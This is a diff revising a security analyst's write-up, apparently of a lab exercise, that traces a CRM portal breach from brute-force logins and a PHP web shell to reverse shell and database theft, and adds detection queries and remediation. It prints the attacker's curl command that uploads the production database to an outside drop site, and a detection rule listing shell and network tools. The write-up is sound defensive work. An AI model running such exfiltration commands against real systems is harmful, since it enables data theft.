@@ -14,10 +14,17 @@ hide:
 </div>
 
 <span class="soc-muted">
-Investigating a full compromise of the CRM portal. We tracked the attacker from the initial brute-force attempts to the web shell upload, payload decoding, and final data exfiltration.
+Investigating a full compromise of the CRM portal. I tracked the attacker from the brute-force attempts to the web shell upload, payload decoding and final data exfiltration.
 </span>
 
 </div>
+
+!!! abstract "Summary"
+    **What happened:** `34.67.91.83` brute-forced the CRM login, uploaded a PHP web shell (`invoice.php`), opened a reverse shell to `115.58.148.86:8080`, read the CRM config and uploaded the production database to `portaldrop2025.xyz`.
+
+    **Impact:** Full server compromise and theft of the production CRM database.
+
+    **Key IOCs:** `34.67.91.83` · `115.58.148.86` · `portaldrop2025.xyz` · `/CRM/portal/uploads/invoice.php`
 
 !!! failure "🚨 EDR Alert: Suspicious File Write"
     **Trigger:** The EDR agent on `TPMHQ-CRM01` flagged a suspicious file creation event in the web directory.
@@ -31,7 +38,7 @@ Investigating a full compromise of the CRM portal. We tracked the attacker from 
 
 ## 🚪 Phase 1: Access Analysis (Logs)
 
-We started by analyzing the Apache access logs to verify how the attacker bypassed authentication.
+I started with the Apache access logs to see how the attacker got past authentication.
 
 === "1. Attacker IP"
     **Finding:** A single IP address, `34.67.91.83`, generated a high volume of traffic compared to other sources.
@@ -39,10 +46,12 @@ We started by analyzing the Apache access logs to verify how the attacker bypass
     ![IP Stats](./assets/task-5/task-5-1.png)
 
 === "2. Brute Force Counts"
-    **Finding:** The attacker performed a brute-force attack.
+    **Finding:** Counting `POST` requests to `login.php` by response code shows a brute-force pattern.
     
-    * **Failed Login Attempts (401):** 35
-    * **Successful Logins (200):** 18
+    * **401 (rejected):** 35
+    * **200 (OK):** 18
+
+    A `200` response on its own does not prove a login worked, because many apps return 200 for a failed login page too. What confirms success here is what came next: the same IP made an authenticated upload to `/CRM/portal/upload.php`.
     
     ![Login Counts](./assets/task-5/task-5-2.png)
 
@@ -85,12 +94,14 @@ After gaining access, the attacker automated the upload of a malicious PHP file.
 
 ## ⚡ Phase 3: Execution & Payloads
 
-The attacker executed commands by passing Base64 encoded strings to the `invoice.php` web shell. We decoded these to understand their intent.
+The attacker ran commands by passing Base64-encoded strings to the `invoice.php` web shell. I decoded them in CyberChef to see what they did.
 
 === "Command 1: Recon"
     **Encoded Payload:** `ZDJodllXMXA`
     
-    **Decoded:** `whoami`
+    **Decoded:** `ZDJodllXMXA` → `d2hvYW1p` → `whoami`
+
+    The command was Base64-encoded **twice**, a simple trick to slip past filters that only decode once.
     
     The attacker verified they had code execution on the server.
     
@@ -135,12 +146,47 @@ With a stable shell, the attacker moved to their final objective: stealing data.
     
     **Command:**
     ```bash
-    curl -sS -T /var/lib/trycrm/prod.db [https://portaldrop2025.xyz/x7Ja0mlqP](https://portaldrop2025.xyz/x7Ja0mlqP)
+    curl -sS -T /var/lib/trycrm/prod.db https://portaldrop2025.xyz/x7Ja0mlqP
     ```
     
     **Action:** The attacker exfiltrated the production database (`prod.db`) to a remote drop site.
     
     ![Exfiltration](./assets/task-5/task-5-11.png)
+
+---
+
+## 🔔 Detection Opportunities
+
+!!! example "Detections I would add"
+    These are example queries; index and field names depend on your environment.
+
+    === "Login brute force"
+        ```spl
+        index=web sourcetype=access_combined method=POST uri_path="*login.php"
+        | bin _time span=5m
+        | stats count(eval(status=401)) AS failed count(eval(status=200)) AS ok BY _time clientip
+        | where failed >= 10
+        ```
+
+    === "Web server spawning a shell"
+        ```yaml
+        title: Web server process spawning a shell or network tool
+        logsource: { product: linux, category: process_creation }
+        detection:
+          selection:
+            ParentImage|endswith: ['/php-fpm7.4', '/apache2', '/httpd', '/nginx']
+            Image|endswith: ['/bash', '/sh', '/curl', '/wget', '/nc']
+          condition: selection
+        level: high
+        ```
+        This one rule would have caught the reverse shell, the config read and the exfiltration.
+
+    === "PHP written to uploads folder"
+        ```spl
+        index=edr event_type=file_create file_path="*/uploads/*"
+            (file_name="*.php" OR file_name="*.phtml")
+        | table _time host user process file_path
+        ```
 
 ---
 
@@ -153,7 +199,8 @@ With a stable shell, the attacker moved to their final objective: stealing data.
       <ul>
         <li><strong>Attacker IP:</strong> 34.67.91.83</li>
         <li><strong>C2 IP:</strong> 115.58.148.86</li>
-        <li><strong>Data Lost:</strong> CRM Database & Configs</li>
+        <li><strong>Exfil Site:</strong> portaldrop2025.xyz</li>
+        <li><strong>Data Lost:</strong> Production CRM database (<code>prod.db</code>) and config</li>
       </ul>
     </div>
   </div>
@@ -162,9 +209,12 @@ With a stable shell, the attacker moved to their final objective: stealing data.
     <div class="soc-card-body">
       <div class="soc-card-title">Remediation Steps</div>
       <ul>
-        <li>Isolate <code>TPMHQ-CRM01</code> immediately.</li>
-        <li>Revoke all database secrets found in <code>config.json</code>.</li>
-        <li>Block <code>portaldrop2025.xyz</code> at the firewall.</li>
+        <li>Isolate <code>TPMHQ-CRM01</code> and remove <code>invoice.php</code>.</li>
+        <li>Rotate every secret in <code>config.json</code> and reset the brute-forced account.</li>
+        <li>Block <code>34.67.91.83</code>, <code>115.58.148.86</code> and <code>portaldrop2025.xyz</code>.</li>
+        <li>Fix the upload form: allow-list file types and stop PHP executing in <code>uploads/</code>.</li>
+        <li>Add login rate limiting and MFA to the CRM portal.</li>
+        <li>Assess the stolen database for personal data and breach-notification duties.</li>
       </ul>
     </div>
   </div>
